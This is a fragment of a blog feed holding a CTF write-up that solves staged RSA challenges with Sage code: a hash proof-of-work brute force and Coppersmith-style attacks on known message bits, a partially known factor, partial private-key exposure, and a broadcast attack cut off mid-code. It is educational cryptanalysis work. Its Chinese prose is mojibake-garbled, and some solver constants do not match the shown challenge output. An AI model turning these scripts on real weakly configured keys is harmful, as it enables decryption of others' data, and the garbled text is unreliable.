      &lt;p&gt;Here is a summary of knowledge points for binary security. The reason for this article is that I can learn binary security specificallyüòÑ.&lt;/p&gt;
    
    </summary>
    
      <category term="Binary" scheme="http://www.yof3ng.xyz/categories/Binary/"/>
    
    
      <category term="Binary" scheme="http://www.yof3ng.xyz/tags/Binary/"/>
    
  </entry>
  
  <entry>
    <title>2019Âº∫ÁΩëÊùØ_Copperstudy</title>
    <link href="http://www.yof3ng.xyz/2019/05/29/2019%E5%BC%BA%E7%BD%91%E6%9D%AF-Copperstudy/"/>
    <id>http://www.yof3ng.xyz/2019/05/29/2019Âº∫ÁΩëÊùØ-Copperstudy/</id>
    <published>2019-05-29T00:44:33.000Z</published>
    <updated>2019-05-29T03:08:26.786Z</updated>
    
    <content type="html"><![CDATA[<p>‰∏ÄÈÅìRSAËøá‰∏ÄÈÅçÂêÑÁßçÊîªÂáª„ÄÇ</p><a id="more"></a><p>[TOC]</p><h1 id="üö©2019Âº∫ÁΩëÊùØ-Copperstudy"><a href="#üö©2019Âº∫ÁΩëÊùØ-Copperstudy" class="headerlink" title="üö©2019Âº∫ÁΩëÊùØ_Copperstudy"></a>üö©2019Âº∫ÁΩëÊùØ_Copperstudy</h1><blockquote><p>üò≠Âç°Âú®Á¨¨‰∫îÂÖ≥Ôºå‰∏ÄÁúãwpÂèëÁé∞Â∞ëcopy‰∫Ü‰∏Ä‰∏™nÔºå‰ª•‰∏∫ÊúânÂíåm‰∏§‰∏™Êú™Áü•Êï∞Ôºàps:sageÁúüÂº∫Â§ßÔºâ„ÄÇ</p></blockquote><h2 id="‚úÖChallenge-0"><a href="#‚úÖChallenge-0" class="headerlink" title="‚úÖChallenge 0"></a>‚úÖChallenge 0</h2><p>Âè™ÈúÄÁàÜÁ†¥ÂæóÂá∫skrÁöÑÂÄºÔºåËøôÊòØÈó®Êßõ„ÄÇ</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>proof<span class="token punctuation">:</span> skr<span class="token operator">=</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>skr<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span>a904dcc09fcdc1d641905b0b50513922c94ad030223cf8eb3bbaa9b21b6788a5<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>skr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span></code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#------------step 1</span>cipher <span class="token operator">=</span> <span class="token string">''</span>skr_part <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token keyword">for</span> a <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> b <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> skr_part <span class="token operator">+</span> chr<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span>c<span class="token punctuation">)</span>            result <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print(result)</span>            <span class="token keyword">if</span>  result <span class="token operator">==</span> cipher<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                exit<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="‚úÖChallenge-1"><a href="#‚úÖChallenge-1" class="headerlink" title="‚úÖChallenge 1"></a>‚úÖChallenge 1</h2><p>ÂØÜÊñáÈ´ò‰ΩçÂ∑≤Áü•ÔºåÊú™Áü•‰ΩéÊØîÁâπÊîªÂáª„ÄÇ</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">1</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x5ab3c00a116dc6834ed79ad55036f3a81cf7d4cb41098118ca9efe1ccff298b951259a668da68c607e0ed85db54ac5243aaa380f0259e67f05a13de2b5f1e081c47e03d3cd785ccc182b316d87ac2be82a34dee2af8814dc70b55d33c1b5a7c300f07ba8a1086aaac63da37b234842661e971f533d65dacce3b477eb1232efb5L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x41522844c262cd5e8c5d3064d1719131ba1803f6e35b3ad4c5838f758dcdc7201e296b3966bad4839b280017af8c788a13702a99aa0faddc4588c0091e3a728825e6b022dc1c3c9ec06a00cb54454e280daacd81ef822ee362d09d0ecb798d15e20918173aefe733b40b533205996de6a6ab3650827662065c03985e2dc6266aL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">>></span><span class="token number">72</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">72</span><span class="token punctuation">)</span><span class="token operator">=</span>0x765a5c92257d16f953ce13eb83bb338727e1eff15a5f4e75251f9d82e719620a008f88d5946a943963d403e1bf395ce6b8b93edcadb503000000000000000000L<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span></code></pre><p>code:</p><pre class=" language-python"><code class="language-python">e <span class="token operator">=</span> <span class="token number">0x3</span>b <span class="token operator">=</span> 0x9e67d3a220a3dcf6fc4742052621f543b8c78d5d9813e69272e65ac676672446e5c88887e8bfdfc92ec87ec74c16350e6b539e3bd910b000000000000000000Ln <span class="token operator">=</span> 0xa1888c641a05aeb81b3d1686317a86f104791fe1d570a5b11209f45d09ea401d255a70744e7a2d39520e359c23a9f1209ee47f496dbd279e62ee1648b3a277ced8825298274322e0a7a86deea282676310a73b6bb946fc924c34ac6c8784ff559bf9a004c03fb167ef54aaea90ce587f2f3074b40d7f632022ec8fb12e659953Lc<span class="token operator">=</span>0x93145ece45f416a11e5e9475518f165365456183c361500c2f78aff263028c90f20b7d97205f54e21f3bcc8a556b457889fde3719d0a0f9c9646f3f0d0a1e4bee0f259f023168fe8cc0511848c1635022fcc20b6088084585e2f8055a9d1b1d6bdb228087900bf7c6d42298f8e45c451562c816e2303990834c94e580bf0cbd1L<span class="token comment" spellcheck="true">#72bitsÊú™Áü•</span>kbits<span class="token operator">=</span><span class="token number">72</span>PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token operator">^</span>e<span class="token operator">-</span>cx0 <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"x: %s"</span> <span class="token operator">%</span>hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>x0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># m = 765a5c92257d16f953ce13eb83bb338727e1eff15a5f4e75251f9d82e719620a008f88d5946a943963d403e1bf395ce6b8b93edcadb503750332f65eeb1e19a8</span></code></pre><h2 id="‚úÖChallenge-2"><a href="#‚úÖChallenge-2" class="headerlink" title="‚úÖChallenge 2"></a>‚úÖChallenge 2</h2><p>Â∑≤Áü•ÈÉ®ÂàÜÂõ†Êï∞È´òBitÔºåÊú™Áü•‰ΩéÊØîÁâπÊîªÂáª„ÄÇ</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">2</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x241ac918f708fff645d3d6e24315e5bb045c02e788c2b7f74b2b83484ce9c0285b6c54d99e2a601a386237d666db2805175e7cc86a733a97aeaab63486133103e30c1dca09741819026bd3ea8d08746d1d38df63c025c1793bdc7e38d194a30b492aadf9e31a6c1240a65db49e061b48f1f2ae949ac9e7e0992ed24f9c01578dL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">65537</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x1922e7151c779d6bb554cba6a05858415e74739c36df0bcf169e49ef0e566a4353c51a306036970005f2321d1d104f91a673f40944e830619ed683d8f84eaf26e7a93c4abe1dbd7ca3babf3f4959def0e3d87f7818d54633a790fc74e9fed3c5b5456c21e3f425240f6217b0b14516cb59aa0ce74b83ca17d8cc4a0fbc829fb8L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token operator">>></span><span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">=</span>0x2c1e75652df018588875c7ab60472abf26a234bc1bfc1b685888fb5ded29ab5b93f5105c1e9b46912368e626777a873200000000000000000000000000000000L</code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#from sage.all import *</span><span class="token comment" spellcheck="true">#import binascii</span>n <span class="token operator">=</span> <span class="token number">0x68f56087cddf01e39e938d40df9a28bc9e5579d19d2763e7361ee464ae79e503d99a1c07eeec8c95cd928eb1ce41e0ba01bed85c45b2c0bc3c8ec04327f702d28f2983e9a8672c11cbb4a53279f22666ad5e6329d3ca32607f2d1b14f79315df440be17e254a59f614fb0bee9d49f3706c8dd67427cf7cc542324e15cbe27657</span>p4 <span class="token operator">=</span><span class="token number">0xedbe4e8eb2ba136c89848560f57b081e6e49a2ae7457ff5093b6b7182f484453fe8b1b51bb207618af5d5d06dc16c099</span>cipher <span class="token operator">=</span> 0x109824d42a3b891f9a6f3c21efa09cf01f59ad8d8b85953a515e4fd9799e72cce08328a200b17fb901508b0395964936e35fb698be4ab3fc275255bb2aaa49a6546df3f8963b543e2759c6ab517f9c1b4a0d9e3eba1a09ce35fec8025d286e56d7bbde2e2fa7b05402857b2425ff9a27034c9c04ccf703ba562ccf0726be2fe5Le2 <span class="token operator">=</span> <span class="token number">65537</span>pbits <span class="token operator">=</span> <span class="token number">512</span>kbits <span class="token operator">=</span> pbits <span class="token operator">-</span> p4<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> p4<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>p4 <span class="token operator">=</span> p4 <span class="token operator">&lt;&lt;</span> kbitsPR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> x <span class="token operator">+</span> p4roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span><span class="token keyword">if</span> roots<span class="token punctuation">:</span>    p <span class="token operator">=</span> p4<span class="token operator">+</span>int<span class="token punctuation">(</span>roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"p: "</span><span class="token punctuation">,</span> hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> n <span class="token operator">%</span> p <span class="token operator">==</span> <span class="token number">0</span>    q <span class="token operator">=</span> n<span class="token operator">/</span>int<span class="token punctuation">(</span>p<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"q: "</span><span class="token punctuation">,</span> hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> gcd<span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span>    phin <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> gcd<span class="token punctuation">(</span>e2<span class="token punctuation">,</span>phin<span class="token punctuation">)</span>    d <span class="token operator">=</span> inverse_mod<span class="token punctuation">(</span>e2<span class="token punctuation">,</span>phin<span class="token punctuation">)</span>    flag <span class="token operator">=</span> pow<span class="token punctuation">(</span>cipher<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># m = 191445a91032bc5eb2f1ffc6db4db109b3c46e5b1d3cf92279d63712c7ae16725db646496b02c6a04c648e46bdc8430d82f39a240323fca0cc1ab38b16e5c107</span></code></pre><h2 id="‚úÖChallenge-3"><a href="#‚úÖChallenge-3" class="headerlink" title="‚úÖChallenge 3"></a>‚úÖChallenge 3</h2><p>Â∑≤Áü•ÈÉ®ÂàÜÁßÅÈí•Ôºå‰ΩÜÁßÅÈí•È´òÊØîÁâπÊú™Áü•ÔºåPartial Key Exposure Attack(ÈÉ®ÂàÜÁßÅÈí•Êö¥Èú≤ÊîªÂáª)„ÄÇ</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x51fb3416aa0d71a430157d7c9853602a758e15462e7c08827b04cd3220c427bbb8199ed4f5393dae43f013b68732a685defc17497f0912c886fa780dfacdfbb1461197d95a92a7a74ade874127a61411e14a901382ed3fb9d62c040c0dbaa374b5a4df06481a26da3fca271429ff10a4fc973b1c82553e3c1dd4f2f37dc24b3bL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x3d7e16fd8b0b1afdb4e12594c3d8590f1175800ef07bb275d7a8ad983d0d5d5fd5c6f81efa40f5d10c48bb200f805e679d633ee584748e5feef003e0921dea736ba91eef72f3d591d3a54cd59fd36f61140fdd3fb2e2c028b684e50cbeae4a1f386f6ab35359d46a29996c0f7d9a4a189f1096150496746f064c3cc41cf111b0L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>d<span class="token operator">=</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>d<span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span>0x17c4b18f1290b6a0886eaa7bf426485a3994c5b71186fe84d5138e18de7e060db57f9580381a917fdfd171bfd159825a7d1e2800e2774f5e4449d17e6723749bL<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span>d <span class="token operator">=</span> 0x36a7780f1c08f66d7563a8fdbae2401c4e5eb8d97452b056fcadde216b2d6fd27abbbf38a37b7e742d4ab7cf04cc6f03e9fd64dbaa060c85af51a55ea733fd2017c4b18f1290b6a0886eaa7bf426485a3994c5b71186fe84d5138e18de7e060db57f9580381a917fdfd171bfd159825a7d1e2800e2774f5e4449d17e6723749bL</code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">partial_p</span><span class="token punctuation">(</span>p0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    nbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">^</span>kbits<span class="token operator">*</span>x <span class="token operator">+</span> p0    f <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span><span class="token punctuation">(</span>nbits<span class="token operator">//</span><span class="token number">2</span><span class="token operator">-</span>kbits<span class="token punctuation">)</span><span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># find root &lt; 2^(nbits//2-kbits) with factor >= n^0.3</span>    <span class="token keyword">if</span> roots<span class="token punctuation">:</span>        x0 <span class="token operator">=</span> roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        p <span class="token operator">=</span> gcd<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token operator">*</span>x0 <span class="token operator">+</span> p0<span class="token punctuation">,</span> n<span class="token punctuation">)</span>        <span class="token keyword">return</span> ZZ<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">find_p</span><span class="token punctuation">(</span>d0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    X <span class="token operator">=</span> var<span class="token punctuation">(</span><span class="token string">'X'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> e<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        results <span class="token operator">=</span> solve_mod<span class="token punctuation">(</span><span class="token punctuation">[</span>e<span class="token operator">*</span>d0<span class="token operator">*</span>X <span class="token operator">-</span> k<span class="token operator">*</span>X<span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">-</span>X<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> k<span class="token operator">*</span>n <span class="token operator">==</span> X<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">)</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> results<span class="token punctuation">:</span>            p0 <span class="token operator">=</span> ZZ<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            p <span class="token operator">=</span> partial_p<span class="token punctuation">(</span>p0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> n<span class="token punctuation">)</span>            <span class="token keyword">if</span> p<span class="token punctuation">:</span>                <span class="token keyword">return</span> p<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># n = 0x51fb3416aa0d71a430157d7c9853602a758e15462e7c08827b04cd3220c427bbb8199ed4f5393dae43f013b68732a685defc17497f0912c886fa780dfacdfbb1461197d95a92a7a74ade874127a61411e14a901382ed3fb9d62c040c0dbaa374b5a4df06481a26da3fca271429ff10a4fc973b1c82553e3c1dd4f2f37dc24b3bL</span>    e <span class="token operator">=</span> <span class="token number">3</span>    <span class="token comment" spellcheck="true"># d = 0x17c4b18f1290b6a0886eaa7bf426485a3994c5b71186fe84d5138e18de7e060db57f9580381a917fdfd171bfd159825a7d1e2800e2774f5e4449d17e6723749bL</span>    n <span class="token operator">=</span> <span class="token number">57569201048993475052349187244752169754165154575782760003851777813767048953051839288528137121670999884309849815765999616346303792471518639080697166767644957046582385785721102370288806038187956032505761532789716009522131450217010629338000241936036185205038814391205848232364006349213836317806903032515194407739</span>    nbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>    kbits <span class="token operator">=</span> floor<span class="token punctuation">(</span>nbits<span class="token operator">*</span><span class="token number">0.5</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"kbits : "</span><span class="token punctuation">,</span> kbits     d0 <span class="token operator">=</span> <span class="token number">1244848677959253796774387650148978357579294769878147704641867595620534030329181934099194560059806799908134954814673426128260540575360296026444649631806619</span>    <span class="token keyword">print</span> <span class="token string">"lower %d bits (of %d bits) is given"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>kbits<span class="token punctuation">,</span> nbits<span class="token punctuation">)</span>    p <span class="token operator">=</span> find_p<span class="token punctuation">(</span>d0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"found p: %d"</span> <span class="token operator">%</span> p    q <span class="token operator">=</span> n<span class="token operator">//</span>p    <span class="token comment" spellcheck="true"># print d</span>    <span class="token keyword">print</span> inverse_mod<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># m = 856119b6bdb17543c2089fefb23173e6cf6aff2d0c755760ac97fb9b3ca869a0875b5052f5a4dcef4c64c76ae97de9897398a79b291a851f2ebffef6dde90fdf</span></code></pre><h2 id="‚úÖChallenge-4"><a href="#‚úÖChallenge-4" class="headerlink" title="‚úÖChallenge 4"></a>‚úÖChallenge 4</h2><p>ÁªôÂá∫‰∏âÁªÑ(n,c)ÔºåÈááÁî®‰ΩéÊåáÊï∞ÂπøÊí≠ÊîªÂáª„ÄÇ</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">4</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n1<span class="token operator">=</span>0x4b25bd834da788533ebef06f552bc8230024d1a571226770bd93bad3b202af4de7f680252a61cc423b3143db075196d6c282e71e84a3f3fe582c69c822389ddf76a86f9169334868119a884b8185c4ee559a3540141c785f2a9e1d59e3c828b26fc785ae4b578da073a39000fbaca6f30807a6110079dc64693dd1089835ea0bL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c1<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n1<span class="token punctuation">)</span><span class="token operator">=</span>0x5e6a4b86018060a6c38952cfd450695ca90444c51d4e0de4690dbadd5000f7bb62e752bbd70c27f342792cc669f0d650b0c8e31b233963c32ebc2297d5aae650a8be7ba5a49319cc010ea8333de09fb4ae9e25af4cce79afcaad80263fbb02329dadb49bfb5f87791c9d29e52103f0153a200f7a11b00086c3c7ae6bbc30269L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n2<span class="token operator">=</span>0x2388ddafc70ba72e181857376f3b23bf6b95c5f721a05e5e499caed0ee81a40031223718156752eef2c7535d8d8d0224126975492f8f002ca98d923ba3f05bff14eac24fb35dd50683cadc3ae0fa55ac368ebe5eb4ecfeb48ada4d785d7c64524783ef50a7c599a27b6a2afa9e1c1a41c6aba40dfd316eef4dc6718eba2af1c5L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c2<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n2<span class="token punctuation">)</span><span class="token operator">=</span>0x71c907c67faf78314ff0332a7fe1d23fd6c9d788425affd54b851c805327fe363c340b047b555f356b1d8b6a930cb22a2e2eb3eb492ab4b307bc782c34fe1dfd032a2d838a80fbf8f6990baa4c712bc9f3bcae964806d418301cd25bc35c0d07a3fc24b25ecc527d3bfafaa5c6ffcf171446238925a76039a2aadc557efb871L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n3<span class="token operator">=</span>0x33e9cbd05b84dc1e5d314656c937c2225351bd0573a5d2d8db357db8afb65be91b0362f8c1b9bbaab51c23decfff77cf8160e260c3374c2fd5b69d1a64cdddb5bd6e37e049e4a657d4a239177b9ec23a873ae272861567b8ea000880d0ba8e7f0449de97f955a78e78e7c8a3becbf3adb6825326786d98ecc30d34be67b5be69L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c3<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n3<span class="token punctuation">)</span><span class="token operator">=</span>0x37bf32f9bfd3afc668b2fb4f48ab3e888bbc204eda2dd05af8dc08974698aa7808cb8623ee16cb17ccc9e27de90d283569390f1ea155a645e46a47f4a1c147d139b631219a94ea3fcac314515a112c7e673ddf594482eec00c0ec8c46dbf4bc4532c19a5dcdbc0a1c8882937b5546653e73c047473df8aa350d876c7a62f60fL<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span></code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">broadcast</span><span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2 <span class="token punctuation">,</span>n3<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> <span class="token punctuation">[</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">,</span> n3<span class="token 